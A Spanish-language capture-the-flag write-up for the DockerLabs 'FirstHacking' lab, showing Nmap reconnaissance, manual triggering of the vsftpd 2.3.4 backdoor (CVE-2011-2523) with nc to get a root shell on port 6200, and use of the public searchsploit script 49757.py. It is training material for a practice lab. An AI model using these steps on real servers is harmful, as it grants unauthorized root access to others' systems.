📝 Writeup – FirstHacking

Plataforma: DockerLabs

📌 1. Información General

Nombre: FirstHacking

Objetivo: Identificación y explotación de servicio vulnerable

Dificultad: Muy baja (Introductoria)

Tipo de vulnerabilidad: Backdoor en servicio FTP

🔎 2. Reconocimiento

Se realizó escaneo completo de puertos con Nmap:

nmap -sS -sC -sV -p- 172.17.0.2 -oN scan.txt

Resultado relevante:
21/tcp open  ftp  vsftpd 2.3.4


El servicio FTP ejecutaba:

vsftpd 2.3.4

🚨 3. Identificación de Vulnerabilidad

Se ejecutó escaneo de vulnerabilidades:

nmap --script vuln 172.17.0.2


Resultado:

Servicio vulnerable a:
CVE-2011-2523

Confirmación de backdoor explotable

Ejecución remota de comandos como root

💀 4. Explotación Manual

Se estableció conexión al servicio FTP:

nc 172.17.0.2 21


Se activó la backdoor utilizando:

USER test:)
PASS test


El servicio respondió con error interno, indicando activación de la puerta trasera.

Posteriormente se abrió conexión al puerto oculto 6200:

nc 172.17.0.2 6200


Verificación de privilegios:

id


Resultado:

uid=0(root) gid=0(root)


Se obtuvo acceso root remoto sin autenticación válida.

🖥 5. Post-Explotación

Se obtuvo shell interactiva:

/bin/bash -i


Confirmación de entorno:

hostname
cat /proc/1/cgroup


Se identificó que el servicio estaba ejecutándose dentro de un contenedor Docker.

⚠ 6. Impacto

Esta vulnerabilidad permite:

Acceso remoto como root

Ejecución arbitraria de comandos

Compromiso total del servidor

Movimiento lateral en red interna

Posible instalación de persistencia o malware

No requiere:

Credenciales válidas

Fuerza bruta

Interacción del usuario



## 7 _ Explotacion con script

- Realizo la busqueda de la vulnerabilidad con searchsploit
 ```
 searchsploit vsftpd 2.3.4
 ```

- Al realizar la busqueda encuentro un script para metasploit (que no voy a utilizar) y una puerta trasera con python
```
vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py
```

- Me dirijo a una carpeta preparada para guardar los archivos para la explotacion. Descargo el archivo seleccionado
```
searchsploit -m unix/remote/49757.py
```

- Para utilizar el script solo tengo que colocar la ip luego el mismo ingresa como root
```
python3 49757.py 172.17.0.2
```
